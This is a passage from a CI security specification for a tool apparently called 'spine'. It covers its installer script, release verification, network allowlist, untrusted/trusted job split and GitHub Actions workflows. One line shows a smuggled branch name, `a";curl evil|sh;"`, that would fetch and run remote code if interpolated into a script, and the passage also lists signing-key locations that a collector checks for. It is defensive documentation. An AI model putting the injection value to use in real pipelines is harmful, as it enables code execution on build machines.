**Computed digests for exactly these bytes**, with `@@DIST_BASE@@` unsubstituted — a rendered `ci.sh` carries the release's URL there and has a different id:

| | |
|---|---|
| `git hash-object` (sha1) | `131f13fb0312162579605999d3f9f4e90098c74c` |
| SHA-256 of the file | `d6bcf50cf675614033aaef61df104aad253d30c4accc756719599ad5bd41060b` |
| Lines | 319 |

Both were computed by running `git hash-object` and `shasum -a 256` over the file this section reproduces. **They moved twice on 2026-08-27.** First `SPINE_ALLOWED_HOSTS` dropped `repo.maven.apache.org` and `services.gradle.org`, which the owner's decision of 2026-08-26 made dead — Kotlin is not a v1 language, `gradle` is a reserved runner token emitted by nothing, and no invocation set can reach a Gradle build — and the comment above it was rewrapped over the same four lines, leaving the count at 307 (§15 D10, §5.6). Then the process-wide `umask 077` was narrowed, for the reason §5.4 item 1 now states: `umask 022`, an explicit `chmod 0700 "$WORK"`, and `0755` on `$INSTALL_DIR` and `$BIN`. That is twelve lines and the count moved to 319. The blob id is the value a `files[]` record for `.spine/ci.sh` would carry under `object_format: sha1` for this unsubstituted rendering.

**Verified by execution, not by reading.** The script was syntax-checked under `sh`, `dash`, `bash` and `zsh`, and its `collect` path was run end to end against a scratch repository with a stubbed collector: a clean run printed one `result=` line and exited 1 on a failing collector, a conflicting merge exited 2 with `needs-rebase`, `SPINE_PIPELINE_KEY=1` exited 2 at the probe before anything was fetched, a HEAD not on the candidate exited 2, and an unfetched trunk exited 2. The `json_one` extractor was exercised against a manifest containing an adversarial `files[]` path spelled `weird, {trunk}: "x"` and returned `main`. **The umask narrowing was re-verified the same way on 2026-08-27**, over these bytes: all four shells parse them; `install` and `collect` both run to completion against a stubbed distribution served from a local tree; `$WORK` is `drwx------` while the run holds it; and the install directory and the binary come out `drwxr-xr-x` and `-rwxr-xr-x`, which is what makes them reachable to the mapped id of RF §7.1's M1.

### 5.4 What the script does, in order

1. **Fixes `IFS` and `LC_ALL=C`, sets `umask 022`,** and drops every relative or empty `PATH` entry. A candidate that commits `./git` or `./curl` must not be able to interpose on the installer. The umask is **022 and not 077**, and the restrictive mode is applied where it is owed instead: `$WORK` — the only directory here that ever holds unverified bytes — is `chmod 0700` explicitly, and `$INSTALL_DIR` and the verified binary are `0755`. The reason is RF §7.1's. M1 spawns every runner, and its boundary probe, under an id that is by construction neither the collector's uid nor 0, and the collector inherits this script's umask: at 077 every checkout the collector writes, and the binary the probe re-execs, are unreachable to that id, and `profile=container` could not be licensed on any host. The binary is a hash-verified release artifact and not a secret; both directories stay writable only by the invoking uid.
2. **`collect` only: rule 0's key-visibility probe** (§6.1). Refuses if any of `SPINE_PIPELINE_KEY`, `SPINE_PUSH_KEY`, `SPINE_PUSH_TOKEN` is *set*, empty or not; refuses if `SPINE_TRUST_ROOT` is unset. Both before a byte is downloaded and long before any repository code runs.
3. **git preflight.** `git --version` parsed to major.minor and refused below 2.38 (PB §11: `merge-tree --write-tree`); `git check-ref-format --branch` over both ref arguments.
4. **Policy from the base.** `git show "origin/<trunk>:.spine/manifest.json"`, then two members and no others: `params.trunk`, which must equal the argument, and `cli.dist_hash`, which must be `sha256:` plus 64 lowercase hex.
5. **Install and verify** (§5.5).
6. **`install` mode stops here** and prints the binary path.
7. **`collect` only: the registry allowlist** (§5.6).
8. **`collect` only: the synthetic merge.** `git merge-tree --write-tree refs/remotes/origin/<trunk> refs/heads/<candidate>`; a non-zero exit is `needs-rebase` and exit 2 with no file, which is RF §7.1 step 5's "the collector fails the job and writes nothing".
9. **`collect` only: the collector**, run from the repository top level with stdin from `/dev/null` and stdout redirected to stderr. Its exit status is captured, not propagated: the file's existence decides between exit 1 and exit 2.

**`ci.sh` never parses the manifest as JSON.** No JSON parser is present on every runner image, and requiring one would put a dependency between the pinned release and the job that installs it. `json_one` splits on JSON structure characters and accepts only a line that is exactly `"key": "value"`; absence and multiplicity are both refusals, never a guess. It needs no `cli.version`, because **the version is derived from the hash-verified artifact list** rather than read from the manifest beside the hash: a version string that could be read independently of the digest is a string that could disagree with it. §14 R4.

### 5.5 The release artifact list, and the platform table

PB §6.7 defines `dist_hash` as "the SHA-256 of the release's *artifact list* — a file the release publishes naming every platform artifact and the wheel with its own SHA-256" and fixes neither its location nor its bytes. Both are fixed here. §14 R5, §15 D7.

**Location — content-addressed.** For a pinned `cli.dist_hash` of `sha256:<H>`:

```
<SPINE_DIST_BASE>/<H>/artifacts.txt      the list
<SPINE_DIST_BASE>/<H>/<artifact-name>    every artifact the list names
```

Keying the directory on the list's own digest is what lets `ci.sh` fetch the list before it knows the version, and it makes the pin sufficient: one 64-hex string locates and authenticates everything.

**Bytes — `sha256sum` format, and nothing else.**

- UTF-8, LF-terminated, every line terminated including the last, no CR anywhere, no BOM, no blank lines, no comments, no header.
- Each line is `<64 lowercase hex>` `U+0020` `U+0020` `<artifact name>`. Two spaces, the format `sha256sum` writes and `sha256sum -c` reads.
- Artifact names match `spine-<version>-<target>.tar.gz` for platform artifacts and `spine-<version>-py3-none-any.whl` for the wheel. `<version>` is `[0-9A-Za-z._+-]+`.
- **Lines sorted ascending by the bytes of the artifact name.** Two builds of one release produce one list, byte for byte, or `dist_hash` is not a pin.
- `dist_hash` is the SHA-256 of exactly these bytes.

**Platform table.** `uname -s`/`uname -m` → target token:

| `uname -s` | `uname -m` | target |
|---|---|---|
| `Linux` | `x86_64`, `amd64` | `x86_64-unknown-linux-musl` |
| `Linux` | `aarch64`, `arm64` | `aarch64-unknown-linux-musl` |
| `Darwin` | `arm64` | `aarch64-apple-darwin` |
| `Darwin` | `x86_64` | `x86_64-apple-darwin` |
| anything else | | refused, exit 2 |

**v1 ships no Windows CI target** and says so rather than half-supporting one: `.tar.gz` is the only container, `gzip -dc | tar -xf -` the only unpack, and a Git Bash job would need a `.zip` path, a `.exe` suffix and a different `uname` match. PB §7.1 already names Windows as the platform where the TTY and agent-socket residuals are worst; a CI target there would be a fourth arrangement nobody specified. §18 OPEN-4.

**Exactly one artifact per target.** `ci.sh` refuses a list with none (the release does not build for this runner) and refuses a list with two (a release whose own list is ambiguous is not a pin). The binary independently verifies its own bytes against the same list at start-up (PB §6.7), so the check is made twice by two different parties.

### 5.6 The registry allowlist

PB §7.1 puts the untrusted stage's network allowlist "in `.spine/ci.sh`, a floor path". It is there, and its honest reading is stated rather than implied:

- **`ci.sh` declares and configures. The boundary enforces.** A POSIX shell script cannot filter a socket. `SPINE_ALLOWED_HOSTS` is exported for a container network policy, a proxy sidecar or an egress firewall to read; `PIP_INDEX_URL`, `NPM_CONFIG_REGISTRY` and `PUB_HOSTED_URL` are set when `SPINE_REGISTRY_PROXY` is given. **The list is one host set per v1 language that has a registry**: `pypi.org` and `files.pythonhosted.org` for Python, `registry.npmjs.org` for TypeScript/JavaScript, `pub.dev` for Dart. **SwiftPM has no single environment knob and no registry host**: it fetches from whatever git remotes the manifest names, and its mirrors live in the repository's own build configuration, which `C-T2` freezes and G8 guards — so a candidate cannot move them mid-flight even though `ci.sh` cannot set them. §15 D10.

  **`repo.maven.apache.org` and `services.gradle.org` were removed on 2026-08-27.** They were there for Kotlin, which the owner dropped on 2026-08-26; `kotlin` is not in `params.langs`' domain (`manifest.md` §3.3) and `gradle` is a reserved runner token no adapter emits (`import-resolver.md` §11.1), so no invocation set can reach a Gradle build and the two entries granted the untrusted job egress nothing in v1 could use. `.spine/ci.sh` is `spine-owned` with its blob recorded in the manifest, so this is shipped bytes: §5.3's two digests moved with it.
- **The *when* half is enforced and tested; the *which hosts* half is declared.** Since 2026-08-27 the only boundary v1 ships (RF §7.1, M1) creates a **network namespace** as well as the mount, PID, IPC and user ones, and **every runner invocation is spawned loopback-only**. `profile=container` may not be written unless a fourth probe, **P4**, passed: the probe's interface set is exactly loopback and an outbound `connect(2)` fails. So *"then none"* is a control the collector performs and can fail, not a claim — and a collector that gave a runner egress records `profile=none`, fails auto-merge precondition 1 on that fact alone, and raises the `class=tripwire` `G11` wire (PB §7.4 rule 5). What is **not** enforced is the allowlist itself: narrowing the one phase that keeps the job's network to `SPINE_ALLOWED_HOSTS` is still a container network policy, a proxy sidecar or an egress firewall the host puts in front of the socket, exactly as the first bullet says. PB §7.1 now promises that and no more. RF §14 OPEN-9 is closed; RF §13 R34 records the reading.
- **Dependency restore has its own phase, and it is the only phase with a route off the host.** The collector runs it once per checkout — for `B` and for `T`, two per run, never one per runner — **before the first runner invocation against that checkout** and outside every runner invocation, from bytes it reads at `origin/<trunk>:.spine/restore.sh`, never from a checkout: the same rule `.spine/ci.sh` itself is read under (PB §7.4 rule 0). Trunk's script runs against `T`'s tree, so **the untrusted job's one egress window is never candidate-authored**, and changing it is a protected-floor landing like any other (`.spine/**`, PB §7.3). The path is optional and carries **no `files[]` record and no template**: `spine init` writes none, `manifest.md` §6.2 asks for none, and where trunk has no such file the phase is empty and every runner still runs loopback-only. RF §7.1, *The restore phase*, is normative for all of it — what it runs under, its `params.timeout` bound, and that it contributes no record, no id, no status and no read of its exit code. **This file is unchanged by it**: `ci.sh` neither runs the restore phase nor knows the path, so §5.3's two digests do not move.
- **The distribution host is not on the registry allowlist and must not be.** PB §7.1 confines the untrusted stage's network to the dependency-restore phase and denies it to every runner — and `ci.sh` reaches `SPINE_DIST_BASE` *before* that phase exists, to fetch the release it is about to verify. (The installer's fetch is the trusted job's too, and neither job is inside a boundary when it happens: RF §7.1's step 6 comes after.) The two are different accesses with different lifetimes: the installer's fetch is authenticated by a digest read from trunk and happens before any repository code exists in the job; the restore's is not. An allowlist that names only registries denies the one fetch that has a hash to check. §15 D19.
- The list is a render of the pinned release. A repository changes it the way it changes any floor path: a protected review.

## 6. The two-job contract, provider-independent

Every conforming arrangement satisfies all of this. §7, §8 and §9 are three renderings of it.

### 6.1 The untrusted job

| # | Obligation | PB |
|---|---|---|
| U1 | **Its definition comes from trunk, not from the candidate.** A push-triggered job runs the candidate's file and could simply never call the collector — or call something else and write a file that claims everything a real one claims. | §7.4 rule 0 |
| U2 | It is the **only** job that runs on `intent/*`, `quick/*` and `spine/upgrade-*`. | §7.4 rule 0 |
| U3 | `permissions: contents: read`, or the provider's equivalent, and **no secret**. Its ambient job token is a secret in all but name and is bounded to read. | §7.4 rule 0, §7.1 |
| U4 | It executes `.spine/ci.sh` **read from `origin/<trunk>`**, and nothing else from the repository before the collector. | §7.4 rules 0, 2 |
| U5 | It **fails the run** if a pipeline-key variable is visible to it. This is rule 0's probe (below). | §7.4 rule 0 |
| U6 | It hands over the result file — **its only artifact** — preserving the path of §6.3, even when the collector exited non-zero. | §7.4 rule 3, §11 |
| U7 | It computes `T` itself, collects the `B` id set before any process runs against `T`'s content, and enforces `params.timeout`. All of this is the collector's, invoked by U4. | §7.4 rule 3, RF §7.1 |
| U8 | **The job's network reaches the candidate's tests through nothing.** Every runner invocation is spawned loopback-only and RF §7.1's **P4** tests it before `profile=container` is written; dependency restore is a phase of the **collector**, running trunk's `.spine/restore.sh` once per checkout before the first invocation against it. This job therefore adds **no** restore, install or setup step of its own: U4 already forbids running anything from the repository before the collector, and a restore step here would execute candidate-authored lifecycle scripts before rule 0's key-visibility probe had run. | §7.1, §7.4 rules 0, 3, RF §7.1 |

**Rule 0's key-visibility probe, exactly.** Two parties assert it and they assert different things.

- **`.spine/ci.sh` refuses to run** when `SPINE_PIPELINE_KEY`, `SPINE_PUSH_KEY` or `SPINE_PUSH_TOKEN` is set — set at all, empty value included. It refuses *before* fetching anything and long before repository code executes, which is the point: a job that can see the key is a job no candidate code should run in. `ci.sh` **does not strip** those variables. Stripping would launder a misconfigured pipeline into a passing assertion, and rule 0 asks the job to fail, not to cope. §14 R6.
- **The collector measures and records.** `keys_visible=` in the result-file header is RF §4.2's predicate over signing key material of *any* kind — the three variables above, plus `SSH_AUTH_SOCK`, `GPG_AGENT_INFO`, a readable `~/.ssh` or `~/.gnupg` — over the collector's own environment and every runner invocation's. It is what reaches the trusted stage; `ci.sh`'s refusal is what stops the run.
- **The provider's ambient token is not signing key material** and does not set `keys_visible=true`. It cannot produce a `Spine-Seal`. What bounds it is U3.

### 6.2 The trusted job

| # | Obligation | PB |
|---|---|---|
| T1 | Triggered **only** from a trunk-scoped event, whose definition the provider takes from trunk. Never from a push, never from a pull-request event, never from `merge_group`. | §7.4 rule 0 |
| T2 | The pipeline key lives in an environment whose **deployment-branch rule is the trunk only**. | §7.4 rule 0 |
| T3 | Checks out **full history plus an explicit fetch of `refs/heads/intent/*`**, or the lease registry is empty and G7 is vacuous. It also fetches `quick/*` and `spine/upgrade-*`, which the same argument reaches. | §11, §5.4 step 3 |
| T4 | Installs the pinned release through `.spine/ci.sh install`, read from `origin/<trunk>`, and runs **no repository code**: not the candidate's, not trunk's, not a build. | §7.4 rules 2–3, §7.1 |
| T5 | Restores **no cache**, and rebuilds the graph `--fresh`. Implied by `spine check --ci`. | §7.4 rule 3 |
| T6 | Ingests exactly one result file, materialized at the path of §6.3, from the untrusted run's artifact and from nowhere else. | §7.4 rule 3, RF §8.1 |
| T7 | Pushes trunk with a credential the untrusted job does not hold. The bypass principal bypasses required checks only; the non-fast-forward rule has no bypass list. | §7.4 rule 0, §5.4 |
| T8 | **Publishes the gate report to `refs/notes/spine` after the CAS**, on every landing (§6.5). | §7.4 rule 4 |
| T9 | Keeps the canonical gate-report bytes as an artifact of its own run, `if: always()`. | §6.5 |

### 6.3 The result-file handoff

The contract, stated once and rendered three times:

1. The collector writes `<repo-root>/.spine/cache/results/<T>.jsonl` — repo-relative, exactly that path, one file however many runners ran (RF §3). `<repo-root>` is `git rev-parse --show-toplevel` of the repository `ci.sh` was invoked in, whatever detached checkouts the collector makes elsewhere. §14 R8.
2. The untrusted job's **only** artifact carries that one file and nothing else. No log, no report, no second copy, no directory of runs.
3. The trusted job **materializes it at exactly `.spine/cache/results/<T>.jsonl` relative to its own workspace**, then checks that the materialized tree holds exactly one entry, that the entry is a regular file and not a symlink, and that its name ends `.jsonl`. Whether the *bytes inside the transport container* carry that path or a flat name is the provider's business; RF §8.1's rule binds the path the trusted stage reads from. §14 R9.
4. Identity is spine's, not the definition's. The trusted stage compares the header's `tree=` with the `T` it computed itself and the stem with the header (RF §3, RF §8.3 step 1). A stale or swapped file is `base-moved`, and a forged one still has to satisfy `tool=` against trunk's pin. **The YAML checks shape; `spine check` checks identity.** A definition that tried to check identity would be a second, unsealed implementation of RF §8.3.

### 6.4 The candidate ref → `--land` mapping

Normative, and the order is normative:

| Candidate ref | Invocation |
|---|---|
| `quick/reseal-<O>` | `spine check --ci --land --reseal` |
| `intent/<ID>` | `spine check --ci --land <ID>` |
| `quick/<name>` | `spine check --ci --land --quick quick/<name>` |
| `spine/upgrade-<version>` | `spine check --ci --land` |
| anything else | refuse, exit 3 |

**`quick/reseal-*` is tested first because it is a `quick/*` ref.** PB §5.5 puts a reseal's review commits on `refs/heads/quick/reseal-<O>` and lands them with `--land --reseal`; a router that matches `quick/*` first would land a reseal as an ordinary quick-lane change, which is a different envelope with a different `Spine-Event` and a different review rule. §15 D22.

### 6.5 Publication of the gate report

PB §7.4 rule 4: *"The trusted stage publishes the full report to `refs/notes/spine`, and that is not optional."* GR §4.4 fixes the ref, the annotated object and the bytes. This section fixes where it happens in the job and what its failure means.

- **`spine check --ci --land` publishes it, not the definition.** The report's canonical bytes are spine's (GR §2); a definition that assembled a note would be a second serializer of an artifact that is a digest. The CI definition uploads a copy and does nothing else.
- **After the CAS, and never before** (GR §4.4.2). A note on a commit that lost the CAS annotates an object no ref reaches. The order inside `--land` is therefore: step 4 build `L` → step 5 G9 and G10 on `L` in a scratch clone → step 6 the compare-and-swap → **then** `git hash-object -w` the canonical bytes and `git notes --ref=spine add -C <blob> <L>` and `git push origin refs/notes/spine`.

  **Step 4 writes the subject; it does not compose one.** PB §5.5 as of v0.19 makes a landing's first line **derived, not written** — a pure function of the envelope, `<id>: <the intent's title>` for a gated landing, `quick: <summary>` for the quick lane, and the tombstone and reseal forms of PB §11 — and step 5's **G9 recomputes it and refuses a landing whose subject it did not produce**. No CI definition composes, edits or passes in a commit message; a definition that did would be refused one step later. The line stays **outside `envelope=`**, so nothing in §6.5's bytes, no `report=`, no seal and no signature moves with it, and the note published below is unaffected either way. Two consequences are the definitions': in configuration (b) the **provider** builds the tree and the message (§10.2), so a body-edited or web-composed squash lands `unattested` on the subject rule as it already does on the seal's; and the quick lane's summary is free text, which — since every toolkit lifecycle landing rides the quick lane (`manifest.md` §6.8) — is the residual PB §5.5 names rather than a hole this document can close.
- **`--land` writes the canonical bytes to `.spine/cache/report.json`** under `--ci`, overwritten per run, inside the gitignored cache. The definition uploads it `if: always()`. This is not diagnostics: it is the only copy of the report's **attested** members (GR §4) once the run ends, and GR §4.4.4 is explicit that without them no candidate report can ever be assembled again — "a lost note is a landing whose judgement is permanently unverifiable by anyone". §14 R17, §15 D8.
- **A failed note push fails the job and retracts nothing.** Exit 5, `note-publish-failed`. The landing is complete: the CAS succeeded, trunk's tip is `L`, the seal verifies, G9's ledger walk is unaffected. Nothing in this design can un-land a commit that reached trunk (PB §5.4), and a rule that tried would make the audit trail's transport an input to the ledger's validity.
- **Recovery is by hand, and v1 offers no command for it.** `--land` refuses an id already sealed on trunk (PB §5.4 step 2), so re-running the job cannot republish. The remedy is GR §4.4.2's two commands over the artifact of T9. §18 OPEN-5, §15 D18.
- **Concurrency.** `refs/notes/spine` is one ref and every landing pushes it. A rejected non-fast-forward push is answered by fetching the ref, re-applying this landing's note, and retrying — bounded, never with `--force` (GR §4.4.2). The trusted job's `concurrency` group of §7.3 makes the race rare; it does not make it impossible, and the retry is spine's, not the definition's.

### 6.6 Exit codes of `spine check --ci --land`

Fixed here, the way GR §4.3 fixes `--verify`'s. No definition may infer a landing's outcome from anything else.

| Exit | Status | Meaning | The definition's obligation |
|---|---|---|---|
| 0 | `landed` | The CAS succeeded and the note was published. | Succeed. |
| 1 | `blocked` | Gates produced a wire or a floor hit; the landing waits on a review. A gate report exists. | Fail the job. Do not re-queue. |
| 2 | `base-moved` | Trunk or the branch moved; the record is void (PB §6.3 G11). | Re-queue the two-job run on the new tip (§7.5), or leave it to the next scheduled run. |
| 3 | `refused` | A precondition of running at all: bad candidate ref, no trust root, no usable seal key, `needs-rebase`, version skew (G15). | Fail the job. Never retry. |
| 4 | `reconstruction-failed` | G9 or G10 refused the push at PB §5.4 step 5. The landing is discarded, the run ends, **no retry and no `C-M3` consumption**. | Fail the job. Never re-queue: a deterministic failure re-runs identically, and it is an indexer defect to file against spine. |
| 5 | `note-publish-failed` | The landing is complete; `refs/notes/spine` was not updated. | Fail the job so a human sees it. Do not re-queue. |

## 7. GitHub Actions

### 7.1 Why `pull_request_target`, and what it costs

GitHub takes a `pull_request_target` workflow's definition **from the base branch**. That is the whole of U1 on GitHub, and it is a structural property of the provider rather than a check spine performs. The alternatives were weighed:

- **`push`** — the candidate's file. Refused; it is exactly what rule 0 names.
- **`merge_group`** — the merge-group ref's own file, and the merge group's content is trunk merged with the candidate, so a candidate that edits the workflow edits the definition that judges it. PB §7.4 rule 0 forbids `merge_group` for the *trusted* job in the same sentence in which it puts the *untrusted* job on it. §15 D5.
- **A push-triggered dispatcher on the candidate, chained by `workflow_run`** — PB §7.4 rule 0's other suggestion. The chained handler's definition does come from the default branch, and a hostile dispatcher can only fail to fire (fail-closed) or run with `contents: read` and no secrets. It is refused here for one reason and one only: whether a `workflow_run`-triggered workflow can itself trigger a second `workflow_run` workflow is a provider behaviour this document could not verify offline, and specifying an arrangement on an unverified provider behaviour is the "probably right" this directory exists to refuse. §18 OPEN-2.

**The cost is stated plainly: on GitHub, a candidate branch needs an open pull request against trunk as its event source.** `spine new` does not open it — spine ships no provider API client and no mandatory API key (PB §1.1) — so opening the PR is the human's or the agent's act, and it is the one piece of provider ceremony the design does not remove. `init --ci github` prints it. §14 R23.

**`params.trunk` must equal the repository's default branch.** `workflow_run` takes its definition from the *default* branch, and an environment's deployment-branch rule is evaluated against the ref the job runs on, which for `workflow_run` is the default branch. If trunk is not the default branch, the trusted job runs a definition spine does not control and the environment rule guards the wrong ref. `init --ci github` refuses. §15 D6.

### 7.2 `.github/workflows/spine-collect.yml`

```yaml
# Rendered by `spine init --ci github` from template ci-github-collect@N. spine-owned:
# do not edit. `.github/workflows/**` is on the protected floor (PB 7.3).
name: spine-collect

on:
  pull_request_target:
    types: [opened, synchronize, reopened]
    branches: ["main"]

permissions:
  contents: read

concurrency:
  group: spine-collect-${{ github.event.pull_request.head.label }}
  cancel-in-progress: true

defaults:
  run:
    shell: bash --noprofile --norc -euo pipefail {0}

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    env:
      SPINE_TRUNK: "main"
      SPINE_CANDIDATE: ${{ github.event.pull_request.head.ref }}
      SPINE_HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
      SPINE_THIS_REPO: ${{ github.repository }}
      SPINE_TRUST_ROOT: ${{ vars.SPINE_TRUST_ROOT }}
    steps:
      - name: Refuse anything that is not this repository's own candidate branch
        run: |
          if [ "$SPINE_HEAD_REPO" != "$SPINE_THIS_REPO" ]; then
            echo "spine: refusing a head outside $SPINE_THIS_REPO" >&2; exit 1
          fi
          case "$SPINE_CANDIDATE" in
            intent/*|quick/*|spine/upgrade-*) ;;
            *) echo "spine: not a candidate ref: $SPINE_CANDIDATE" >&2; exit 1 ;;
          esac
          if [ -z "$SPINE_TRUST_ROOT" ]; then
            echo "spine: vars.SPINE_TRUST_ROOT is unset" >&2; exit 1
          fi

      - uses: actions/checkout@PIN_CHECKOUT
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          fetch-depth: 0

      - name: Fetch trunk, then drop every credential from the checkout
        run: |
          git fetch --no-tags --prune origin \
            "+refs/heads/$SPINE_TRUNK:refs/remotes/origin/$SPINE_TRUNK"
          git config --local --name-only --get-regexp '\.extraheader$' \
            | while read -r k; do git config --local --unset-all "$k"; done || true
          git config --local --unset-all core.sshCommand || true
          if git config --local --name-only --get-regexp '\.extraheader$'; then
            echo "spine: a credential survived in .git/config" >&2; exit 1
          fi

      - name: Collect
        id: collect
        run: |
          d="$RUNNER_TEMP/spine"; mkdir -p "$d"; chmod 700 "$d"
          git show "origin/$SPINE_TRUNK:.spine/ci.sh" >"$d/ci.sh"
          rc=0
          sh "$d/ci.sh" collect "$SPINE_TRUNK" "$SPINE_CANDIDATE" >"$d/out" || rc=$?
          echo "rc=$rc" >>"$GITHUB_OUTPUT"
          if [ "$rc" -eq 2 ]; then
            echo "spine: ci.sh refused; no result file" >&2; exit 1
          fi
          line="$(cat "$d/out")"
          case "$line" in
            result=*) ;;
            *) echo "spine: ci.sh printed no result line" >&2; exit 1 ;;
          esac
          h="$RUNNER_TEMP/spine-handoff"; mkdir -p "$h"; chmod 700 "$h"
          cp -- "${line#result=}" "$h/"

      - uses: actions/upload-artifact@PIN_UPLOAD_ARTIFACT
        if: always() && steps.collect.outputs.rc != ''
        with:
          name: spine-result
          path: ${{ runner.temp }}/spine-handoff
          if-no-files-found: error
          retention-days: 1

      - name: Report the collector's own verdict
        env:
          RC: ${{ steps.collect.outputs.rc }}
        run: |
          if [ "$RC" != "0" ]; then
            echo "spine: the collector exited $RC; the result file was handed over" >&2
            exit 1
          fi
```

Four details are load-bearing and easy to lose:

- **No candidate-controlled value is interpolated into a `run:` script.** Every `${{ }}` that carries a branch name, a repository name or a step output crosses into shell as an `env:` binding. `${{ }}` is substituted into the script *text* before the shell sees it, so a branch named `` a";curl evil|sh;" `` in a `run:` block is code. The candidate names its own branch. §14 R20.
- **The handoff is staged into `$RUNNER_TEMP/spine-handoff`** rather than uploaded from `.spine/cache/results`. `actions/upload-artifact` roots the artifact at the least common ancestor of what it matches, and some of its versions exclude dot-prefixed path segments by default — `.spine` is one. Copying to a dot-free directory removes both dependencies, so the arrangement does not turn on which version the release pins, and §6.3 step 3 restores the exact path on the other side.
- **The upload is `if: always()`** and the job's failure is deferred to a later step, so exit 1 from `ci.sh` — the collector ran and failed — still hands the file over. A red suite must reach G1 as evidence, not vanish as a failed job.
- **`fetch-depth: 0` and the explicit trunk fetch are both required.** `actions/checkout` fetches the named ref; `origin/<trunk>` is a separate fetch, and `ci.sh` refuses without it.

### 7.3 `.github/workflows/spine-land.yml`

```yaml
# Rendered by `spine init --ci github` from template ci-github-land@N. spine-owned.
name: spine-land

on:
  workflow_run:
    workflows: ["spine-collect"]
    types: [completed]

permissions:
  actions: write
  contents: read

concurrency:
  group: spine-land
  cancel-in-progress: false

defaults:
  run:
    shell: bash --noprofile --norc -euo pipefail {0}

jobs:
  land:
    # Rule 0, as three provider facts a candidate cannot forge.
    if: >-
      github.event.workflow_run.event == 'pull_request_target' &&
      github.event.workflow_run.path == '.github/workflows/spine-collect.yml' &&
      github.event.workflow_run.head_repository.full_name == github.repository
    runs-on: ubuntu-latest
    environment: spine-trusted
    timeout-minutes: 120
    env:
      SPINE_TRUNK: "main"
      SPINE_CANDIDATE: ${{ github.event.workflow_run.head_branch }}
      SPINE_RUN_ID: ${{ github.event.workflow_run.id }}
      SPINE_TRUST_ROOT: ${{ vars.SPINE_TRUST_ROOT }}
      SPINE_PIPELINE_KEY: ${{ secrets.SPINE_PIPELINE_KEY }}
      SPINE_PUSH_TOKEN: ${{ secrets.SPINE_PUSH_TOKEN }}
    steps:
      - name: Refuse anything that is not a candidate ref
        run: |
          case "$SPINE_CANDIDATE" in
            intent/*|quick/*|spine/upgrade-*) ;;
            *) echo "spine: not a candidate ref: $SPINE_CANDIDATE" >&2; exit 1 ;;
          esac
          for v in SPINE_TRUST_ROOT SPINE_PIPELINE_KEY SPINE_PUSH_TOKEN; do
            eval "s=\${$v:-}"
            if [ -z "$s" ]; then echo "spine: $v is unset" >&2; exit 1; fi
          done

      - uses: actions/checkout@PIN_CHECKOUT
        with:
          ref: "main"
          fetch-depth: 0
          persist-credentials: false

      - name: Authenticate git without writing a credential to disk
        run: |
          b64="$(printf 'x-access-token:%s' "$SPINE_PUSH_TOKEN" | base64 | tr -d '\n')"
          echo "::add-mask::$b64"
          {
            echo "GIT_CONFIG_COUNT=1"
            echo "GIT_CONFIG_KEY_0=http.${{ github.server_url }}/.extraheader"
            echo "GIT_CONFIG_VALUE_0=AUTHORIZATION: basic $b64"
          } >>"$GITHUB_ENV"

      - name: Fetch trunk and every in-flight candidate ref
        run: |
          git fetch --no-tags --prune origin \
            "+refs/heads/$SPINE_TRUNK:refs/remotes/origin/$SPINE_TRUNK" \
            "+refs/heads/intent/*:refs/heads/intent/*" \
            "+refs/heads/quick/*:refs/heads/quick/*" \
            "+refs/heads/spine/upgrade-*:refs/heads/spine/upgrade-*"

      - name: Install the pinned release
        id: spine
        run: |
          d="$RUNNER_TEMP/spine"; mkdir -p "$d"; chmod 700 "$d"
          git show "origin/$SPINE_TRUNK:.spine/ci.sh" >"$d/ci.sh"
          SPINE_INSTALL_DIR="$d/bin" sh "$d/ci.sh" install "$SPINE_TRUNK" >"$d/path"
          echo "bin=$(cat "$d/path")" >>"$GITHUB_OUTPUT"

      - uses: actions/download-artifact@PIN_DOWNLOAD_ARTIFACT
        with:
          name: spine-result
          path: .spine/cache/results
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}

      - name: Check the shape of the handoff
        run: |
          n="$(find .spine/cache/results -mindepth 1 | wc -l | tr -d ' ')"
          if [ "$n" != "1" ]; then
            echo "spine: the artifact holds $n entries, expected 1" >&2; exit 1
          fi
          f="$(find .spine/cache/results -mindepth 1)"
          if [ ! -f "$f" ] || [ -L "$f" ]; then
            echo "spine: the artifact entry is not a regular file" >&2; exit 1
          fi
          case "${f##*/}" in
            *.jsonl) ;;
            *) echo "spine: the artifact entry is not a .jsonl file" >&2; exit 1 ;;
          esac

      - name: Land
        id: land
        env:
          SPINE_BIN: ${{ steps.spine.outputs.bin }}
        run: |
          case "$SPINE_CANDIDATE" in
            quick/reseal-*)  set -- --land --reseal ;;
            intent/*)        set -- --land "${SPINE_CANDIDATE#intent/}" ;;
            quick/*)         set -- --land --quick "$SPINE_CANDIDATE" ;;
            spine/upgrade-*) set -- --land ;;
            *) echo "spine: unroutable candidate" >&2; exit 3 ;;
          esac
          rc=0
          "$SPINE_BIN" check --ci "$@" </dev/null || rc=$?
          echo "rc=$rc" >>"$GITHUB_OUTPUT"

      - uses: actions/upload-artifact@PIN_UPLOAD_ARTIFACT
        if: always() && steps.land.outputs.rc != ''
        with:
          name: spine-report
          path: .spine/cache/report.json
          if-no-files-found: warn
          retention-days: 90

      - name: Re-queue on base-moved
        if: steps.land.outputs.rc == '2'
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh api --method POST \
            "repos/${GITHUB_REPOSITORY}/actions/runs/${SPINE_RUN_ID}/rerun"

      - name: Report the landing's verdict
        env:
          RC: ${{ steps.land.outputs.rc }}
        run: |
          if [ "$RC" != "0" ]; then
            echo "spine: check --ci --land exited $RC (see docs/spec/ci.md 6.6)" >&2
            exit 1
          fi
```

Three details are load-bearing:

- **The `if:` guard is not defence in depth; two of its three clauses are the guarantee.** `workflow_run` matches the triggering workflow **by its `name:`**, and a candidate may add `.github/workflows/anything.yml` with `name: spine-collect` and `on: push`. That workflow runs from the candidate's file and completes, and its completion reaches this workflow. `workflow_run.event == 'pull_request_target'` refuses it, because a `pull_request_target` workflow's definition is the base branch's by construction. `workflow_run.path` refuses it a second time. §14 R11.
- **`actions: write`, not `read`.** `read` is enough to download the artifact; the re-queue of PB §7.4 rule 3 — *"the snippet re-queues the whole two-job run on the new `T`"* — needs `write`. Both are on the trusted side of the boundary. If a repository does not want automatic re-queueing, deleting that one step is safe: `base-moved` then waits for the candidate's next push, at the cost of the liveness PB §5.4 already says optimistic CAS does not guarantee.
